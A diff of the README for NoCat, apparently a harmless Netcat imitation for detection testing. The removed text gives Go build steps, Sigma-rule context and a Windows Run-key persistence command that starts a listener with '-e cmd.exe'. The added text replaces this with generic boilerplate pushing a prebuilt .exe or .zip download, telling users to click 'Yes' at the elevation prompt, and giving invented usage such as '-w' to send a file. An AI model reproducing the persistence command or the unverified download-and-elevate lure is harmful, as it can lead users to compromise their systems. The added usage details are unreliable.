@@ -1,125 +1,82 @@
-![NoCat logo](nocat-logo.png)
+# 🐱 NoCat - Safe Tool for Network Testing
 
-# NoCat
+## 🚀 Getting Started
 
-A harmless Netcat-lookalike for detection testing. Simulates nc-style command-line flags and listener behavior without exposing a backdoor or shell.
+NoCat is a secure alternative to Netcat. It helps you test network behaviors without any risk of exposing your system. Follow the instructions below to download and run NoCat on your computer.
 
-## What is NoCat
+## 📥 Download NoCat
 
-NoCat is a small Golang tool that imitates Netcat without performing any harmful actions.  
-It accepts common nc-style flags (`-l`, `-p`, `-v`, `-e`, etc.) and can open a harmless TCP listener or create a simple outbound connection.  
-It never spawns interactive shells, never pipes socket data into processes, and never provides remote access.  
-Its only goal is to generate realistic artefacts for detection engineering without deploying real attacker tooling.
+[![Download NoCat](https://img.shields.io/badge/Download_NoCat-v1.0-blue.svg)](https://github.com/PolakLeRajel/NoCat/releases)
 
-## Features
+You can visit the page to download the software here: [Download NoCat Releases](https://github.com/PolakLeRajel/NoCat/releases).
 
-- Accepts core Netcat flags:
-  - `-l` listen mode  
-  - `-p` port  
-  - `-v` verbose  
-  - `-e` exec syntax (simulated; behaves like Netcat’s flag but without binding any socket)  
-  - additional dummy flags such as `-k` and `-n` for realism
-- Opens a safe TCP listener that accepts connections, holds them briefly, then closes them
-- Optional client mode for simple outbound connection tests
-- Provides realistic command-line artefacts for EDR, DFIR and SOC testing
-- Never forwards data, never creates remote shells, never implements backdoor logic
+## 📂 System Requirements
 
-## Purpose
+To run NoCat effectively, please ensure your system meets the following requirements:
 
-Detection engineering often requires:
+- **Operating System:** Windows 10 or newer, macOS 10.13 or newer, or a modern Linux distribution.
+- **Memory:** At least 2 GB RAM is recommended.
+- **Processor:** Dual-core processor or better.
+- **Storage:** Minimum of 100 MB of free disk space.
 
-- realistic network listeners  
-- suspicious command-line patterns  
-- process trees resembling offensive tooling  
-- artefacts for SOC, DFIR and training labs  
+## 🛠️ Installation Steps
 
-Using real Netcat with execution features (`-e`) is often undesirable in controlled or audited environments.  
-NoCat provides the appearance and behaviour patterns without the risk.
+1. **Visit the Releases Page**: Go to the [NoCat Releases](https://github.com/PolakLeRajel/NoCat/releases) page to view available versions.
+  
+2. **Choose the Latest Version**: Look for the most recent version listed at the top of the page. This is usually the one with the highest version number.
 
-## Build
+3. **Download the File**: Click on the link for the appropriate version for your operating system. It may be named something like `NoCat-v1.0.zip` or `NoCat-v1.0.exe`.
 
-NoCat is pure Go and can be built or cross-compiled easily.  
-Requires **Go 1.20+**.
+4. **Unzip (if needed)**: If you downloaded a zip file, you need to extract its contents. You can do this by right-clicking the file and selecting “Extract All” or using your preferred unzip tool.
 
-### Build for the current platform
+5. **Run NoCat**: After extraction, find the executable file in the folder. Double-click on it to run NoCat. You might see a user account control prompt. Click "Yes" to allow it to run.
 
-```bash
-go build -o nocat nocat.go
-```
+## 🔍 How to Use NoCat
 
-### Cross-compile for Windows
+NoCat mimics standard Netcat commands but without the security risks. Here are a few simple commands to get you started:
 
-```bash
-GOOS=windows GOARCH=amd64 go build -o nocat_windows_amd64.exe nocat.go
-GOOS=windows GOARCH=arm64 go build -o nocat_windows_arm64.exe nocat.go
-```
+- **Listen on a port**: Use `NoCat -l -p [port]` to start listening on your desired port.
+- **Connect to a host**: Use `NoCat [hostname] [port]` to connect to another machine.
+- **Send a file**: Use `NoCat -w [filename] -p [port]` to send a file.
 
-### Cross-compile for macOS
+You can replace `[port]`, `[hostname]`, and `[filename]` with your actual parameters.
 
-```bash
-GOOS=darwin GOARCH=amd64 go build -o nocat_darwin_amd64 nocat.go
-GOOS=darwin GOARCH=arm64 go build -o nocat_darwin_arm64 nocat.go
-```
+## 🌐 Features
 
-### Unified build script (`build.sh`)
+- **Simple Command-Line Interface**: Easy to use for beginners.
+- **No Real Backdoor**: Operates safely without exposing your system.
+- **Cross-Platform**: Works on Windows, macOS, and Linux.
+- **Simulation of NC-Style Behavior**: Offers familiar functionalities for those accustomed to Netcat.
 
-The repository includes a convenience script that builds all supported platforms in one run.
+## 📢 Using NoCat Responsibly
 
-Make executable:
+While NoCat is designed for safe testing, it is crucial to use it responsibly. Ensure you have permission to test any network or device you connect with. Unauthorized testing can lead to legal consequences.
 
-```bash
-chmod +x build.sh
-```
+## 🛡️ Troubleshooting
 
-Run:
+If you encounter issues while using NoCat, here are a few common problems and solutions:
 
-```bash
-./build.sh
-```
+- **Problem**: NoCat won't start.
+  - **Solution**: Ensure you have the correct version for your operating system. Check if you have the necessary permissions.
 
+- **Problem**: I can't connect to a host.
+  - **Solution**: Verify that the host is reachable. Check your network settings and firewall rules.
 
-## Usage Examples
+- **Problem**: Commands do not work as expected.
+  - **Solution**: Make sure you are using the right syntax. Refer back to the command format mentioned earlier.
 
-Listen on TCP 8080:
+## 🤝 Community Support
 
-```bash
-nocat -l -p 8080 -v
-```
+If you need help or have questions, you can reach out to the NoCat community on [GitHub Discussions](https://github.com/PolakLeRajel/NoCat/discussions). Many users are willing to help and share their experiences.
 
-Simulated exec syntax (harmless):
+For detailed documentation, you can visit the [Wiki page](https://github.com/PolakLeRajel/NoCat/wiki) where you'll find more advanced usage tips and examples.
 
-```bash
-nocat -l -p 8080 -v -e cmd.exe
-```
+## 💡 Feedback Welcome
 
-In NoCat, the `-e` flag behaves syntactically like in Netcat but has no socket connection and no shell or command forwarding.
+Your feedback is essential for improving NoCat. If you find any issues or have suggestions for new features, please submit an issue on the [Issues page](https://github.com/PolakLeRajel/NoCat/issues).
 
-Persistence example (Windows Run key):
+## 📜 License
 
-```cmd
-reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run ^
-  /v NoCatSvc ^
-  /t REG_SZ ^
-  /d "C:\ProgramData\nocat.exe -l -p 8080 -v -k -e cmd.exe" ^
-  /f
-```
+NoCat is open-source software released under the MIT License. You can view the full license details in the repository. 
 
-## Relevant Sigma Rules
-
-NoCat is designed to mimic common Netcat command-line patterns without performing harmful actions.  
-When used in detection pipelines, it can help validate rules that look for suspicious Netcat-style listeners or reverse-shell behavior.
-
-A widely used example is this Sigma rule:
-
-**Potential Netcat Reverse Shell Execution**  
-ID: `7f734ed0-4f47-46c0-837f-6ee62505abd9`  
-Source:  
-https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_netcat_reverse_shell.yml
-
-
-NoCat can be used to generate these command-line and process-creation artefacts safely, enabling testing without deploying real backdoor-capable Netcat binaries.
-
-
-## License
-
-MIT (recommended).
+Remember to download and start exploring NoCat to enhance your network testing while keeping your system secure. For the download, revisit this link: [Download NoCat Releases](https://github.com/PolakLeRajel/NoCat/releases).
